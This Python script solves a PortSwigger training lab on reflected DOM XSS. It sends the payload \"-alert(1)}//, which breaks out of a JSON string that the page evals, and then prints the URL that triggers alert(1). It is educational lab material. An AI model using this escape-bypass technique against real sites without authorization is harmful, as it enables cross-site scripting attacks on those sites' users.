# Lab 12 — Reflected DOM XSS
# PortSwigger: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected
#
# Vulnerability: Search — server reflects search term into JS, client eval()s it
# Aim:           Call alert via reflected DOM XSS
#
# Technique:
#   The server JSON-encodes the search term and injects it into a JS variable:
#     var searchResultsObj = {"results":[],"searchTerm":"INPUT"}
#   A client-side script then eval()s or processes this object.
#
#   The server escapes " to \" but does NOT escape \.
#   Inject \" to force a double-backslash + closing quote:
#     Input:   \"-alert(1)}//
#     Server:  \\" → literal backslash; " → closes the JSON string
#     Result:  {"searchTerm":"\\"-alert(1)}//"}
#     In eval: the \\ is a literal \, the " closes the string, -alert(1) executes
#
# Usage: python xss_lab12.py <url>

import sys
import urllib3
from proxies import proxies
from xss_utils import banner, section, make_session, check_reflection

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAYLOAD = '\\"-alert(1)}//'

if __name__ == "__main__":
    banner()
    section("LAB 12 — REFLECTED DOM XSS")

    if len(sys.argv) != 2:
        print("  Usage: python xss_lab12.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    print(f"  ➜  Sending payload: {PAYLOAD}\n")
    r = session.get(url, params={"search": PAYLOAD})

    # The JSON response will contain the escaped form of our payload
    check_reflection(r.text, PAYLOAD, "Reflected DOM payload")

    print()
    print("  ➜  Open this URL in a browser to trigger JS execution:")
    print(f"     {r.url}")
    print("  ℹ  The \\ defeats the server escape: \\\\ in JS = literal backslash,")
    print("     leaving \" to close the string and allow alert(1) to execute.")
